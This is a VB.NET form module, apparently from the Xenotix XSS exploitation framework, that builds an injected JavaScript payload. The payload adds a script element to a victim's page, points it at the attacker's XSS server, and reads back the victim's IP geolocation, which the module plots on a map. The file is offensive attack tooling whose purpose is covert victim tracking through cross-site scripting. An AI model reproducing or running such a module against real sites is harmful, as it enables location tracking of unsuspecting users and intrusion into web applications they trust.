Imports System.IO
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq

Public Class xss_info_ip2geolocation

    Private Sub xss_info_geovictimip_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next

        IO.File.Delete("ipgeo.txt")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(150, 350)
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        stream.WriteLine("if (document.getElementById('xenotix_ipgeo" & Str(tmp) & "') == null){ ")
        stream.WriteLine(TextBox1.Text.Replace("XSERVERX", xss_server.server_ip))
        stream.WriteLine("script = document.createElement('script');script.id = 'xenotix_ipgeo" & Str(tmp) & "'; document.body.appendChild(script); }")
        stream.Close()
        Button1.Enabled = False
        Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim loc As String = ""
        Dim lat, log As String
        lat = ""
        log = ""
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\ipgeo.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then

            Dim o As JObject = JObject.Parse(line)
            Dim results As List(Of JToken) = o.Children().ToList
           For Each item As JProperty In results
                loc += item.Name.ToString + " : " + item.Value.ToString + "<BR>"
                If (item.Name.ToString.Contains("latitude")) Then
                    lat = item.Value.ToString
                End If
                If (item.Name.ToString.Contains("longitude")) Then
                    log = item.Value.ToString
                End If
            Next

            loc += "<br><img src='http://maps.googleapis.com/maps/api/staticmap?center=" + lat + "," + log + "&amp;zoom=14&amp;size=600x400&amp;sensor=false'>"

            WebBrowser1.ScriptErrorsSuppressed = True
            WebBrowser1.DocumentText = loc
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next

        IO.File.Delete("ipgeo.txt")
        Me.Close()
    End Sub
End Class


